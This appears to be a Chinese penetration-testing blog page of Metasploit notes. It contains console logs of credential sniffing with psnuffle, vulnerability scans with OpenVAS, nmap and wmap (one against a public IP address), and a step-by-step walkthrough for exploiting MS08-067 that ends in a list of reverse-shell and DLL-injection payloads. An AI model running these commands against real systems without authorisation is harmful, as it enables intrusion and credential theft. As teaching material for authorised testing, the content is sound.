<h3 id="psnuffle口令探测"><a href="#psnuffle口令探测" class="headerlink" title="psnuffle口令探测"></a>psnuffle口令探测</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf auxiliary(ssh_login) &gt; use auxiliary/sniffer/psnuffle </span><br><span class="line">msf auxiliary(psnuffle) &gt; run</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br><span class="line">[*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuffle/ftp.rb...</span><br><span class="line">msf auxiliary(psnuffle) &gt; [*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnuffle/imap.rb...</span><br><span class="line">[*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnuffle/pop3.rb...</span><br><span class="line">[*] Loaded protocol SMB from /usr/share/metasploit-framework/data/exploits/psnuffle/smb.rb...</span><br><span class="line">[*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuffle/url.rb...</span><br><span class="line">[*] Sniffing traffic.....</span><br><span class="line"></span><br><span class="line"># 在实际的渗透过程中，只有在得到能够接入对方网络的初始访问点之后，才能方便使用psnuffle模块</span><br></pre></td></tr></table></figure>
<blockquote>
<h2 id="网络漏洞扫描"><a href="#网络漏洞扫描" class="headerlink" title="网络漏洞扫描"></a>网络漏洞扫描</h2></blockquote>
<h5 id="黑盒扫描，白盒扫描"><a href="#黑盒扫描，白盒扫描" class="headerlink" title="黑盒扫描，白盒扫描"></a>黑盒扫描，白盒扫描</h5><h3 id="OpenVAS"><a href="#OpenVAS" class="headerlink" title="OpenVAS"></a>OpenVAS</h3><pre><code>详细内容参见P100
</code></pre><h3 id="使用GSA"><a href="#使用GSA" class="headerlink" title="使用GSA"></a>使用GSA</h3><pre><code>详细内容参见P102
</code></pre><h3 id="在Metasploit中使用OpenVAS"><a href="#在Metasploit中使用OpenVAS" class="headerlink" title="在Metasploit中使用OpenVAS"></a>在Metasploit中使用OpenVAS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; load openvas</span><br><span class="line">[*] Welcome to OpenVAS integration by kost and averagesecurityguy.</span><br><span class="line">[*] </span><br><span class="line">[*] OpenVAS integration requires a database connection. Once the </span><br><span class="line">[*] database is ready, connect to the OpenVAS server using openvas_connect.</span><br><span class="line">[*] For additional commands use openvas_help.</span><br><span class="line">[*] </span><br><span class="line">[*] Successfully loaded plugin: OpenVAS</span><br><span class="line">msf &gt; openvas_connect admin your_openvas_passwd 10.10.10.128 9390 ok</span><br><span class="line">[*] Connecting to OpenVAS instance at 10.10.10.128:9390 with username admin...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#后续步骤在P106</span><br></pre></td></tr></table></figure>
<h3 id="查找特定服务漏洞"><a href="#查找特定服务漏洞" class="headerlink" title="查找特定服务漏洞"></a>查找特定服务漏洞</h3><h4 id="Nmap的使用"><a href="#Nmap的使用" class="headerlink" title="Nmap的使用"></a>Nmap的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; nmap -P0 --script=smb-check-vulns 10.10.10.130</span><br><span class="line">[*] exec: nmap -P0 --script=smb-check-vulns 10.10.10.130</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Starting Nmap 5.51SVN ( http://nmap.org ) at 2017-11-04 20:37 EDT</span><br><span class="line">Nmap scan report for service.dvssc.com (10.10.10.130)</span><br><span class="line">Host is up (0.00083s latency).</span><br><span class="line">Not shown: 985 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">80/tcp   open  http</span><br><span class="line">135/tcp  open  msrpc</span><br><span class="line">139/tcp  open  netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds</span><br><span class="line">777/tcp  open  multiling-http</span><br><span class="line">1025/tcp open  NFS-or-IIS</span><br><span class="line">1026/tcp open  LSA-or-nterm</span><br><span class="line">1027/tcp open  IIS</span><br><span class="line">1032/tcp open  iad3</span><br><span class="line">1521/tcp open  oracle</span><br><span class="line">6002/tcp open  X11:2</span><br><span class="line">7001/tcp open  afs3-callback</span><br><span class="line">7002/tcp open  afs3-prserver</span><br><span class="line">8099/tcp open  unknown</span><br><span class="line">MAC Address: 00:0C:29:94:E4:0E (VMware)</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-check-vulns: </span><br><span class="line">|   MS08-067: VULNERABLE</span><br><span class="line">|   Conficker: Likely CLEAN</span><br><span class="line">|   regsvc DoS: CHECK DISABLED (add &apos;--script-args=unsafe=1&apos; to run)</span><br><span class="line">|   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add &apos;--script-args=unsafe=1&apos; to run)</span><br><span class="line">|   MS06-025: CHECK DISABLED (remove &apos;safe=1&apos; argument to run)</span><br><span class="line">|_  MS07-029: CHECK DISABLED (remove &apos;safe=1&apos; argument to run)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.70 seconds</span><br></pre></td></tr></table></figure>
<h2 id="漏洞结果分析"><a href="#漏洞结果分析" class="headerlink" title="漏洞结果分析"></a>漏洞结果分析</h2><h2 id="渗透测试信息数据库与共享（P110）"><a href="#渗透测试信息数据库与共享（P110）" class="headerlink" title="渗透测试信息数据库与共享（P110）"></a>渗透测试信息数据库与共享（P110）</h2><h3 id="metasploit数据库"><a href="#metasploit数据库" class="headerlink" title="metasploit数据库"></a>metasploit数据库</h3><h3 id="Metasploit中使用PostreSQL数据库"><a href="#Metasploit中使用PostreSQL数据库" class="headerlink" title="Metasploit中使用PostreSQL数据库"></a>Metasploit中使用PostreSQL数据库</h3><h3 id="Nmap与渗透测试数据库"><a href="#Nmap与渗透测试数据库" class="headerlink" title="Nmap与渗透测试数据库"></a>Nmap与渗透测试数据库</h3><h3 id="OpenVAS与渗透测试数据库"><a href="#OpenVAS与渗透测试数据库" class="headerlink" title="OpenVAS与渗透测试数据库"></a>OpenVAS与渗透测试数据库</h3><h3 id="共享自己的渗透测试数据库"><a href="#共享自己的渗透测试数据库" class="headerlink" title="共享自己的渗透测试数据库"></a>共享自己的渗透测试数据库</h3><blockquote>
<h2 id="Web应用渗透技术"><a href="#Web应用渗透技术" class="headerlink" title="Web应用渗透技术"></a>Web应用渗透技术</h2></blockquote>
<h3 id="OWASP-Web-TOP-10"><a href="#OWASP-Web-TOP-10" class="headerlink" title="OWASP Web TOP 10"></a>OWASP Web TOP 10</h3><ul>
<li>SQL注入</li>
<li>跨站脚本</li>
<li>跨站伪造请求</li>
<li>会话认证管理缺陷</li>
<li>安全误配置</li>
<li>不安全密码存储</li>
<li>不安全对象参考</li>
<li>限制URL访问失败</li>
<li>缺乏传输层保护</li>
<li>未验证的重定向和跳转</li>
</ul>
<h3 id="Metasploit中的wmap-Web漏洞扫描器"><a href="#Metasploit中的wmap-Web漏洞扫描器" class="headerlink" title="Metasploit中的wmap Web漏洞扫描器"></a>Metasploit中的wmap Web漏洞扫描器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; load wmap</span><br><span class="line"></span><br><span class="line">.-.-.-..-.-.-..---..---.</span><br><span class="line">| | | || | | || | || |-&apos;</span><br><span class="line">`-----&apos;`-&apos;-&apos;-&apos;`-^-&apos;`-&apos;</span><br><span class="line">[WMAP 1.5.1] ===  et [  ] metasploit.com 2012</span><br><span class="line">[*] Successfully loaded plugin: wmap</span><br><span class="line"></span><br><span class="line">msf &gt; help</span><br><span class="line"></span><br><span class="line">wmap Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    wmap_modules  Manage wmap modules</span><br><span class="line">    wmap_nodes    Manage nodes</span><br><span class="line">    wmap_run      Test targets</span><br><span class="line">    wmap_sites    Manage sites</span><br><span class="line">    wmap_targets  Manage targets</span><br><span class="line">    wmap_vulns    Display web vulns</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    advanced      Displays advanced options for one or more modules</span><br><span class="line">    back          Move back from the current context</span><br><span class="line">    banner        Display an awesome metasploit banner</span><br><span class="line">    cd            Change the current working directory</span><br><span class="line">    color         Toggle color</span><br><span class="line">    connect       Communicate with a host</span><br><span class="line">    edit          Edit the current module with $VISUAL or $EDITOR</span><br><span class="line">    exit          Exit the console</span><br><span class="line">    get           Gets the value of a context-specific variable</span><br><span class="line">    getg          Gets the value of a global variable</span><br><span class="line">    grep          Grep the output of another command</span><br><span class="line">    help          Help menu</span><br><span class="line">    info          Displays information about one or more modules</span><br><span class="line">    irb           Drop into irb scripting mode</span><br><span class="line">    jobs          Displays and manages jobs</span><br><span class="line">    kill          Kill a job</span><br><span class="line">    load          Load a framework plugin</span><br><span class="line">    loadpath      Searches for and loads modules from a path</span><br><span class="line">    makerc        Save commands entered since start to a file</span><br><span class="line">    options       Displays global options or for one or more modules</span><br><span class="line">    popm          Pops the latest module off the stack and makes it active</span><br><span class="line">    previous      Sets the previously loaded module as the current module</span><br><span class="line">    pushm         Pushes the active or list of modules onto the module stack</span><br><span class="line">    quit          Exit the console</span><br><span class="line">    reload_all    Reloads all modules from all defined module paths</span><br><span class="line">    rename_job    Rename a job</span><br><span class="line">    resource      Run the commands stored in a file</span><br><span class="line">    route         Route traffic through a session</span><br><span class="line">    save          Saves the active datastores</span><br><span class="line">    search        Searches module names and descriptions</span><br><span class="line">    sessions      Dump session listings and display information about sessions</span><br><span class="line">    set           Sets a context-specific variable to a value</span><br><span class="line">    setg          Sets a global variable to a value</span><br><span class="line">    show          Displays modules of a given type, or all modules</span><br><span class="line">    sleep         Do nothing for the specified number of seconds</span><br><span class="line">    spool         Write console output into a file as well the screen</span><br><span class="line">    threads       View and manipulate background threads</span><br><span class="line">    unload        Unload a framework plugin</span><br><span class="line">    unset         Unsets one or more context-specific variables</span><br><span class="line">    unsetg        Unsets one or more global variables</span><br><span class="line">    use           Selects a module by name</span><br><span class="line">    version       Show the framework and console library version numbers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Database Backend Commands</span><br><span class="line">=========================</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    creds             List all credentials in the database</span><br><span class="line">    db_connect        Connect to an existing database</span><br><span class="line">    db_disconnect     Disconnect from the current database instance</span><br><span class="line">    db_export         Export a file containing the contents of the database</span><br><span class="line">    db_import         Import a scan result file (filetype will be auto-detected)</span><br><span class="line">    db_nmap           Executes nmap and records the output automatically</span><br><span class="line">    db_rebuild_cache  Rebuilds the database-stored module cache</span><br><span class="line">    db_status         Show the current database status</span><br><span class="line">    hosts             List all hosts in the database</span><br><span class="line">    loot              List all loot in the database</span><br><span class="line">    notes             List all notes in the database</span><br><span class="line">    services          List all services in the database</span><br><span class="line">    vulns             List all vulnerabilities in the database</span><br><span class="line">    workspace         Switch between database workspaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; wmap_sites -a http://202.112.50.74</span><br><span class="line">[*] Site created.</span><br><span class="line">msf &gt; wmap_sites -l</span><br><span class="line">Available sites</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">     Id  Host           Vhost          Port  # Pages  # Forms</span><br><span class="line">     --  ----           -----          ----  -------  -------</span><br><span class="line">     0   202.112.50.74  202.112.50.74  80    0        0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; wmap_targets -t http://202.112.50.74</span><br><span class="line">msf &gt; wmap_run -t</span><br><span class="line">[*] Testing target:</span><br><span class="line">[*] 	Site: 202.112.50.74 (202.112.50.74)</span><br><span class="line">[*] 	Port: 80 SSL: false</span><br><span class="line">============================================================</span><br><span class="line">[*] Testing started. 2017-11-04 21:00:34 -0400</span><br><span class="line"></span><br><span class="line">=[ SSL testing ]=</span><br><span class="line">============================================================</span><br><span class="line">[*] Target is not SSL. SSL modules disabled.</span><br><span class="line"></span><br><span class="line">=[ Web Server testing ]=</span><br><span class="line">============================================================</span><br><span class="line">[*] Loaded auxiliary/admin/http/contentkeeper_fileaccess ...</span><br><span class="line">[*] Loaded auxiliary/admin/http/tomcat_administration ...</span><br><span class="line">[*] Loaded auxiliary/admin/http/tomcat_utf8_traversal ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/frontpage_login ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/http_version ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/open_proxy ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/options ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/robots_txt ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/svn_scanner ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/verb_auth_bypass ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/vhost_scanner ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/web_vulndb ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/webdav_internal_ip ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/webdav_scanner ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/webdav_website_content ...</span><br><span class="line"></span><br><span class="line">=[ File/Dir testing ]=</span><br><span class="line">============================================================</span><br><span class="line">[*] Loaded auxiliary/scanner/http/backup_file ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/brute_dirs ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/copy_of_file ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/dir_listing ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/dir_scanner ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/dir_webdav_unicode_bypass ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/file_same_name_dir ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/files_dir ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/ms09_020_webdav_unicode_bypass ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/prev_dir_same_name_file ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/replace_ext ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/trace_axd ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/writable ...</span><br><span class="line"></span><br><span class="line">=[ Unique Query testing ]=</span><br><span class="line">============================================================</span><br><span class="line">[*] Loaded auxiliary/scanner/http/blind_sql_query ...</span><br><span class="line">[*] Loaded auxiliary/scanner/http/error_sql_injection ...</span><br><span class="line"></span><br><span class="line">=[ Query testing ]=</span><br><span class="line">============================================================</span><br><span class="line"></span><br><span class="line">=[ General testing ]=</span><br><span class="line">============================================================</span><br><span class="line">[*] Analysis completed in 4.058472156524658 seconds.</span><br><span class="line">[*] Done.</span><br><span class="line">++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; wmap_run -e</span><br><span class="line">[*] Using ALL wmap enabled modules.</span><br><span class="line">[*] Testing target:</span><br><span class="line">[*] 	Site: 202.112.50.74 (202.112.50.74)</span><br><span class="line">[*] 	Port: 80 SSL: false</span><br><span class="line">============================================================</span><br><span class="line">[*] Testing started. 2017-11-04 21:02:27 -0400</span><br><span class="line"></span><br><span class="line">=[ SSL testing ]=</span><br><span class="line">============================================================</span><br><span class="line">[*] Target is not SSL. SSL modules disabled.</span><br><span class="line"></span><br><span class="line">=[ Web Server testing ]=</span><br><span class="line">============================================================</span><br><span class="line">Module auxiliary/admin/http/contentkeeper_fileaccess</span><br><span class="line"></span><br><span class="line">[*] Attempting to connect to 202.112.50.74:80</span><br><span class="line">Module auxiliary/admin/http/tomcat_administration</span><br><span class="line">Module auxiliary/admin/http/tomcat_utf8_traversal</span><br><span class="line">[*] Attempting to connect to 202.112.50.74:80</span><br><span class="line">Module auxiliary/scanner/http/frontpage_login</span><br><span class="line">Module auxiliary/scanner/http/http_version</span><br><span class="line">Module auxiliary/scanner/http/open_proxy</span><br><span class="line">Module auxiliary/scanner/http/options</span><br><span class="line">Module auxiliary/scanner/http/robots_txt</span><br><span class="line">Module auxiliary/scanner/http/svn_scanner</span><br><span class="line">Module auxiliary/scanner/http/verb_auth_bypass</span><br><span class="line">Module auxiliary/scanner/http/vhost_scanner</span><br><span class="line">[*]  &gt;&gt; Exception during launch from auxiliary/scanner/http/vhost_scanner: The following options failed to validate: DOMAIN.</span><br><span class="line">Module auxiliary/scanner/http/web_vulndb</span><br><span class="line">[*]  &gt;&gt; Exception during launch from auxiliary/scanner/http/web_vulndb: The following options failed to validate: VULNCSV.</span><br><span class="line">Module auxiliary/scanner/http/webdav_internal_ip</span><br><span class="line">Module auxiliary/scanner/http/webdav_scanner</span><br><span class="line">Module auxiliary/scanner/http/webdav_website_content</span><br><span class="line"></span><br><span class="line">=[ File/Dir testing ]=</span><br><span class="line">============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; vulns   //查看扫描的信息，现在是一个不完整的信息，上面的漏洞扫描过程中止了</span><br><span class="line">[*] Time: 2017-09-04 11:55:41 UTC Vuln: host=10.10.10.254 name=auxiliary/scanner/ssh/ssh_login refs=CVE-1999-0502</span><br></pre></td></tr></table></figure>
<h4 id="渗透模块-（P130）"><a href="#渗透模块-（P130）" class="headerlink" title="渗透模块 （P130）"></a>渗透模块 （P130）</h4><ul>
<li>Metasploit中已有的模块</li>
</ul>
<h2 id="Web应用漏洞扫描探测"><a href="#Web应用漏洞扫描探测" class="headerlink" title="Web应用漏洞扫描探测"></a>Web应用漏洞扫描探测</h2><ul>
<li>各种Web扫描工具（P130）</li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Metasploit关于08-067漏洞的利用/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/Metasploit关于08-067漏洞的利用/" class="post-title-link" itemprop="url">Metasploit关于08_067漏洞的利用</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:08:08 / 修改时间：06:09:08" itemprop="dateCreated datePublished" datetime="2019-01-14T06:08:08+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/security/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="关于08-067漏洞的利用"><a href="#关于08-067漏洞的利用" class="headerlink" title="关于08_067漏洞的利用"></a>关于08_067漏洞的利用</h1></blockquote>
<ul>
<li>1.打开终端</li>
<li><p>2.打开msf控制台</p>
<pre><code>msfconsole
</code></pre><p> 有时候会提示有一个什么数据库没有打开，按照弹出的对画框中的命令，先打开要求的那个数据库，就行了</p>
</li>
<li><p>3.查找漏洞利用模板</p>
<pre><code>msf &gt; search 08_067

Matching Modules
================

 Name                                 Disclosure Date  Rank   Description
 ----                                 ---------------  ----   -----------
 exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
</code></pre></li>
<li><p>4.使用模板</p>
<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi
</code></pre><p> 之后msf的输入变成了这样</p>
<pre><code>msf exploit(ms08_067_netapi) &gt;
</code></pre></li>
<li><p>5.查看需要配置那些信息</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; show options
</code></pre></li>
</ul>
<pre><code>Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
</code></pre><ul>
<li><p>6.设置目标电脑IP</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; set RHOST 192.168.43.176

RHOST =&gt; 192.168.43.176
</code></pre><h3 id="再次查看配置信息"><a href="#再次查看配置信息" class="headerlink" title="再次查看配置信息"></a>再次查看配置信息</h3><pre><code>msf exploit(ms08_067_netapi) &gt; show options
Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.43.176   yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
</code></pre></li>
</ul>
<pre><code>Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
</code></pre><ul>
<li><p>7.查看载荷</p>
<pre><code>msf exploit(ms08_067_netapi) &gt; show payloads

Compatible Payloads
===================

 Name                                                Disclosure Date  Rank    Description
  ----                                                ---------------  ----    -----------
  generic/custom                                                       normal  Custom Payload
  generic/debug_trap                                                   normal  Generic x86 Debug Trap
  generic/shell_bind_tcp                                               normal  Generic Command Shell, Bind TCP Inline
  generic/shell_reverse_tcp                                            normal  Generic Command Shell, Reverse TCP Inline
  generic/tight_loop                                                   normal  Generic x86 Tight Loop
  windows/adduser                                                      normal  Windows Execute net user /ADD
  windows/dllinject/bind_hidden_ipknock_tcp                            normal  Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
  windows/dllinject/bind_hidden_tcp                                    normal  Reflective DLL Injection, Hidden Bind TCP Stager
  windows/dllinject/bind_ipv6_tcp                                      normal  Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
  windows/dllinject/bind_ipv6_tcp_uuid                                 normal  Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
  windows/dllinject/bind_nonx_tcp                                      normal  Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
  windows/dllinject/bind_tcp                                           normal  Reflective DLL Injection, Bind TCP Stager (Windows x86)
  windows/dllinject/bind_tcp_rc4                                       normal  Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption)
  windows/dllinject/bind_tcp_uuid                                      normal  Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
  windows/dllinject/reverse_hop_http                                   normal  Reflective DLL Injection, Reverse Hop HTTP/HTTPS Stager
  windows/dllinject/reverse_http                                       normal  Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
